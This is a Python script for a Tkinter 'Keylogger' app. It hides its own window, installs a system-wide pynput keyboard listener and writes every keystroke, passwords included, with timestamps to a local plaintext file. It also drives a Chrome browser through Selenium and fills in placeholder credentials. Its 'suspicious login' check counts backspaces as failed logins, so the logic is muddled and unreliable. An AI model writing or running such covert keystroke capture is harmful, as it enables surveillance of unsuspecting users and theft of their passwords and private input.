from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from pynput.keyboard import Key, Listener
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

class KeyloggerGUI:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.logged_keystrokes = []
        self.failed_login_count = 0
        self.alerted = False
        self.driver = webdriver.Chrome()  # You need to have chromedriver installed and in your PATH

        self.root = tk.Tk()
        self.root.title("Keylogger")

        self.label = tk.Label(self.root, text="Keylogger is running. Press Esc to stop.")
        self.label.pack()

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack()

    def start_keylogger(self):
        self.root.withdraw()
        self.driver.get("https://example.com")  # Replace "https://example.com" with the website URL
        self.label.config(text="Keylogger is running. Press Esc to stop.")

        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def stop_keylogger(self):
        self.driver.quit()
        self.root.destroy()

    def on_press(self, key):
        try:
            self.logged_keystrokes.append((datetime.now(), key.char))
        except AttributeError:
            self.logged_keystrokes.append((datetime.now(), str(key)))

    def on_release(self, key):
        if key == Key.enter:
            self.check_login_attempt()
        elif key == Key.esc:
            self.save_to_file()
            self.driver.quit()
            self.root.destroy()

    def check_login_attempt(self):
        login_attempt = "".join([str(keystroke) for _, keystroke in self.logged_keystrokes])
        if "Backspace" in login_attempt:
            self.failed_login_count += 1
        else:
            self.failed_login_count = 0
        if self.failed_login_count > 2:
            self.alert("Suspicious login attempt detected!")
        if "password" in login_attempt.lower():
            self.record_signin_attempt()

    def record_signin_attempt(self):
        username = self.driver.find_element(By.ID, "username")  # Replace "username" with the HTML ID of the username input field
        password = self.driver.find_element(By.ID, "password")  # Replace "password" with the HTML ID of the password input field
        login_button = self.driver.find_element(By.ID, "login_button")  # Replace "login_button" with the HTML ID of the login button
        username.send_keys("your_username")
        password.send_keys("your_password")
        login_button.click()

    def alert(self, message):
        if not self.alerted:
            messagebox.showwarning("Alert", message)
            self.alerted = True

    def save_to_file(self):
        with open(self.log_file, "a") as f:
            for timestamp, keystroke in self.logged_keystrokes:
                f.write(f"{timestamp}: {keystroke}\n")

if __name__ == "__main__":
    keylogger_gui = KeyloggerGUI()
    keylogger_gui.root.mainloop()
